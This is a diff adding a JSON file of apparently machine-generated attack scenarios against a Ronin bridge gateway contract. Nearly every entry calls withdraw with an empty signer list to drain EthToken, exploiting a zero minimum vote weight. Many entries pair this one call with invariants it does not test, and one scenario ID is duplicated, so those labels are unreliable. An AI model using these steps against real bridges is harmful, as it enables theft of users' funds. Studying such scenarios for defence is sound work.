@@ -1,0 +1,701 @@
+{
+  "bridge_name": "ronin_2024",
+  "scenarios": [
+    {
+      "scenario_id": "ronin_bridge_asset_conservation_break",
+      "target_invariant": "asset_conservation_total_balance_consistency",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "ronin_20240806"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "By calling withdraw with an empty signer list, the vote weight check passes because minimumVoteWeight() is zero (initializeV3 was never called). This allows the attacker to transfer the entire EthToken balance from the gateway, violating the asset conservation invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "By calling withdraw with an empty signer list, the vote weight check passes because minimumVoteWeight() is zero (initializeV3 was never called). This allows the attacker to transfer the entire EthToken balance from the gateway, violating the asset conservation invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "withdraw_without_signatures",
+      "target_invariant": "asset_conservation_deposit_amount_positive",
+      "vulnerability_class": "missing_signature_check",
+      "confidence": 0.95,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "meterio_20220205",
+        "bnbbridge_20221007",
+        "orbit_20240101",
+        "qubit_20220127"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "500000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with empty signer list; minimumVoteWeight is 0 because totalOperatorWeight is 0, so the call succeeds and transfers 500,000 EthToken from the gateway to the attacker without any deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with empty signer list; minimumVoteWeight is 0 because totalOperatorWeight is 0, so the call succeeds and transfers 500,000 EthToken from the gateway to the attacker without any deposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_asset_conservation_break_001",
+      "target_invariant": "asset_conservation_withdraw_not_exceed_locked",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "synapse_20211109",
+        "orbit_20240101",
+        "qubit_20220127",
+        "thorchain_20210629",
+        "harmony_horizon_20220624"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with empty signer list; minimumVoteWeight is zero because totalOperatorWeight is 0 (initializeV3 never called). This transfers the full EthToken balance from the gateway to attacker, exceeding the totalLocked amount recorded in RoninDeposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with empty signer list; minimumVoteWeight is zero because totalOperatorWeight is 0 (initializeV3 never called). This transfers the full EthToken balance from the gateway to attacker, exceeding the totalLocked amount recorded in RoninDeposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "attack_001",
+      "target_invariant": "asset_conservation_locked_balance_decreases_on_withdraw",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "ronin_20240806"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000",
+            "signers": []
+          },
+          "description": "Exploit that minimumVoteWeight is zero because initializeV3 was never called; withdraw succeeds with empty signer set, draining tokens from the gateway without any corresponding reduction in RoninDeposit.totalLocked, violating the asset conservation invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit that minimumVoteWeight is zero because initializeV3 was never called; withdraw succeeds with empty signer set, draining tokens from the gateway without any corresponding reduction in RoninDeposit.totalLocked, violating the asset conservation invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_withdraw_no_weight",
+      "target_invariant": "asset_conservation_no_token_creation_on_deposit",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "500000000000000000000000",
+            "signers": []
+          },
+          "description": "Exploit zero minimum vote weight: withdraw a large amount of EthToken from the gateway without any required signers, extracting value without a corresponding deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit zero minimum vote weight: withdraw a large amount of EthToken from the gateway without any required signers, extracting value without a corresponding deposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_logic_bug_withdraw_no_votes",
+      "target_invariant": "authorization_only_admin_can_set_relayers",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.95,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "socket_20240116",
+        "crosscurve_20260131",
+        "pgala_20221103",
+        "evodefi_20220607"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with empty signers array. Since initializeV3 was never called, totalOperatorWeight is 0, making minimumVoteWeight() equal to 0. The require passes, allowing the contract to transfer all bridged EthToken to the attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with empty signers array. Since initializeV3 was never called, totalOperatorWeight is 0, making minimumVoteWeight() equal to 0. The require passes, allowing the contract to transfer all bridged EthToken to the attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_missing_signature_check",
+      "target_invariant": "authorization_withdraw_requires_valid_relayer_signature",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.99,
+      "retrieved_exploits": [
+        "crosscurve_20260131"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw without initializing V3, so totalOperatorWeight = 0 and minimumVoteWeight = 0. The empty signers array yields weight 0, satisfying the check, allowing transfer of EthToken from the gateway to attacker, violating the required relayer signature invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw without initializing V3, so totalOperatorWeight = 0 and minimumVoteWeight = 0. The empty signers array yields weight 0, satisfying the check, allowing transfer of EthToken from the gateway to attacker, violating the required relayer signature invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_bridge_withdraw_exploit",
+      "target_invariant": "authorization_deposit_requires_token_approval",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "ronin_20240806"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Exploit missing initializeV3: totalOperatorWeight is 0, so minimumVoteWeight() == 0. Withdraw any amount (here the full balance) with an empty signer list, transferring EthToken from the gateway to attacker."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Exploit missing initializeV3: totalOperatorWeight is 0, so minimumVoteWeight() == 0. Withdraw any amount (here the full balance) with an empty signer list, transferring EthToken from the gateway to attacker."
+        }
+      ]
+    },
+    {
+      "scenario_id": "attack_ronin_bridge_nonce_replay",
+      "target_invariant": "authorization_withdraw_requires_unprocessed_nonce",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "ronin_20240806"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw the entire EthToken balance from the gateway with an empty signer list; totalOperatorWeight is zero so minimumVoteWeight is 0, allowing the call and replaying it violates the nonce‑checking invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Withdraw the entire EthToken balance from the gateway with an empty signer list; totalOperatorWeight is zero so minimumVoteWeight is 0, allowing the call and replaying it violates the nonce‑checking invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_nonce_missing_control",
+      "target_invariant": "uniqueness_deposit_nonce_monotonic_increase",
+      "vulnerability_class": "logic_bug_missing_access_control",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "nomad_20220801"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw the full balance of EthToken from the gateway to attacker. Minimum vote weight is zero because totalOperatorWeight is zero (initializeV3 never called), so any caller can withdraw any amount without signatures."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Withdraw the full balance of EthToken from the gateway to attacker. Minimum vote weight is zero because totalOperatorWeight is zero (initializeV3 never called), so any caller can withdraw any amount without signatures."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_uniqueness_bypass",
+      "target_invariant": "uniqueness_withdraw_processed_once",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "anyswap_20210710",
+        "orbit_20240101"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw all EthToken from the gateway without any signers because minimumVoteWeight is zero after only initializeV4 was called, violating the uniqueness invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Withdraw all EthToken from the gateway without any signers because minimumVoteWeight is zero after only initializeV4 was called, violating the uniqueness invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_withdraw_no_operator_weight",
+      "target_invariant": "uniqueness_no_replay_of_deposit_message",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "nomad_20220801",
+        "qubit_20220127",
+        "meterio_20220205",
+        "thorchain_20210723",
+        "thorchain_20210629"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Since initializeV3 was never called, totalOperatorWeight remains 0, making minimumVoteWeight = 0. The withdraw function only checks that accumulated signer weight meets this threshold, which is always true. Call withdraw with empty signers to transfer the entire EthToken balance from the gateway to the attacker, effectively replaying a non‑existent deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Since initializeV3 was never called, totalOperatorWeight remains 0, making minimumVoteWeight = 0. The withdraw function only checks that accumulated signer weight meets this threshold, which is always true. Call withdraw with empty signers to transfer the entire EthToken balance from the gateway to the attacker, effectively replaying a non‑existent deposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_uniqueness_bypass",
+      "target_invariant": "uniqueness_one_withdraw_per_deposit",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.93,
+      "retrieved_exploits": [
+        "metpassport_20220206",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "500000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw without any signers. Since initializeV3 was never called, totalOperatorWeight is 0, making minimumVoteWeight = 0, so the vote weight check passes and the gateway transfers an arbitrary amount of EthToken to the attacker, violating the one‑withdraw‑per‑deposit invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw without any signers. Since initializeV3 was never called, totalOperatorWeight is 0, making minimumVoteWeight = 0, so the vote weight check passes and the gateway transfers an arbitrary amount of EthToken to the attacker, violating the one‑withdraw‑per‑deposit invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_invariant_break_001",
+      "target_invariant": "uniqueness_processed_count_equals_deposit_count",
+      "vulnerability_class": "logic_bug_missing_vote_requirement",
+      "confidence": 0.97,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205",
+        "metpassport_20220206",
+        "pnetwork_20210919",
+        "thorchain_20210629"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "totalOperatorWeight is zero because initializeV3 was never called, making minimumVoteWeight = 0. Withdraw any amount of EthToken from the gateway without needing any operator signatures, obtaining tokens without a corresponding deposit and violating the processedWithdrawCount ≤ depositCount invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "totalOperatorWeight is zero because initializeV3 was never called, making minimumVoteWeight = 0. Withdraw any amount of EthToken from the gateway without needing any operator signatures, obtaining tokens without a corresponding deposit and violating the processedWithdrawCount ≤ depositCount invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_withdraw_no_vote",
+      "target_invariant": "uniqueness_no_duplicate_lock_event",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.92,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205",
+        "thorchain_2_xscope",
+        "bnbbridge_20221007",
+        "thorchain_3_xscope"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Since initializeV3 was never called, totalOperatorWeight is 0, making minimumVoteWeight = 0. The withdraw function therefore accepts an empty signers array and transfers the entire EthToken balance from the gateway to the attacker, draining tokens without any corresponding deposit."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Since initializeV3 was never called, totalOperatorWeight is 0, making minimumVoteWeight = 0. The withdraw function therefore accepts an empty signers array and transfers the entire EthToken balance from the gateway to the attacker, draining tokens without any corresponding deposit."
+        }
+      ]
+    },
+    {
+      "scenario_id": "attack_scenario_1",
+      "target_invariant": "uniqueness_withdraw_nonce_uniqueness_across_chains",
+      "vulnerability_class": "missing_access_control",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "orbit_20240101"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "First unauthorized withdrawal; minimumVoteWeight is zero, so no signatures required."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "100000000000000000000",
+            "signers": []
+          },
+          "description": "Second withdrawal repeats the same logical operation, violating the global withdraw‑nonce uniqueness invariant."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "First unauthorized withdrawal; minimumVoteWeight is zero, so no signatures required."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Second withdrawal repeats the same logical operation, violating the global withdraw‑nonce uniqueness invariant."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_exploit_001",
+      "target_invariant": "uniqueness_deposit_and_withdraw_balances_match",
+      "vulnerability_class": "logic_bug",
+      "confidence": 1.0,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205",
+        "metpassport_20220206",
+        "thorchain_20210629",
+        "pnetwork_20210919"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Attacker calls withdraw with empty signer list; minimumVoteWeight is zero because totalOperatorWeight is 0 (initializeV3 never called). Gateway transfers its entire EthToken balance to attacker, exceeding any deposited amount."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Attacker calls withdraw with empty signer list; minimumVoteWeight is zero because totalOperatorWeight is 0 (initializeV3 never called). Gateway transfers its entire EthToken balance to attacker, exceeding any deposited amount."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_withdraw_no_auth",
+      "target_invariant": "uniqueness_no_overflow_on_counters",
+      "vulnerability_class": "missing_access_control",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "qubit_20220127",
+        "meterio_20220205",
+        "synapse_20211109",
+        "metpassport_20220206",
+        "pnetwork_20210919"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with empty signers; minimumVoteWeight is 0 because initializeV3 was never called, allowing attacker to drain all EthToken from the gateway."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with empty signers; minimumVoteWeight is 0 because initializeV3 was never called, allowing attacker to drain all EthToken from the gateway."
+        }
+      ]
+    },
+    {
+      "scenario_id": "ronin_bridge_missing_recipient_check",
+      "target_invariant": "authorization_withdraw_requires_recipient_nonzero",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "socket_20240116",
+        "nomad_20220801",
+        "chainswap_20210711",
+        "qanxbridge_20220518"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "500000000000000000000000",
+            "signers": []
+          },
+          "description": "Withdraw a large amount of EthToken to attacker; vote weight check passes because minimumVoteWeight is 0 (totalOperatorWeight is 0)."
+        },
+        {
+          "step": 2,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "0x0000000000000000000000000000000000000000",
+            "amount": "0",
+            "signers": []
+          },
+          "description": "Call withdraw with zero address as recipient, violating the invariant that recipient must be non‑zero."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Withdraw a large amount of EthToken to attacker; vote weight check passes because minimumVoteWeight is 0 (totalOperatorWeight is 0)."
+        },
+        {
+          "waypoint_id": "w2",
+          "after_step": 2,
+          "predicate": "step_2_executed",
+          "description": "Call withdraw with zero address as recipient, violating the invariant that recipient must be non‑zero."
+        }
+      ]
+    },
+    {
+      "scenario_id": "bridge_exploit_no_vote",
+      "target_invariant": "authorization_deposit_requires_caller_not_contract",
+      "vulnerability_class": "logic_bug",
+      "confidence": 0.9,
+      "retrieved_exploits": [
+        "polynetwork_20210810",
+        "meterio_20220205"
+      ],
+      "actions": [
+        {
+          "step": 1,
+          "chain": "destination",
+          "contract": "RoninGatewayV3",
+          "function": "withdraw(address,uint256,address[])",
+          "params": {
+            "recipient": "attacker",
+            "amount": "1000000000000000000000000",
+            "signers": []
+          },
+          "description": "Call withdraw with empty signer list. totalOperatorWeight is 0, so minimumVoteWeight() == 0, allowing withdrawal of any amount of EthToken held by the gateway without any signatures."
+        }
+      ],
+      "waypoints": [
+        {
+          "waypoint_id": "w1",
+          "after_step": 1,
+          "predicate": "step_1_executed",
+          "description": "Call withdraw with empty signer list. totalOperatorWeight is 0, so minimumVoteWeight() == 0, allowing withdrawal of any amount of EthToken held by the gateway without any signatures."
+        }
+      ]
+    }
+  ]
+}
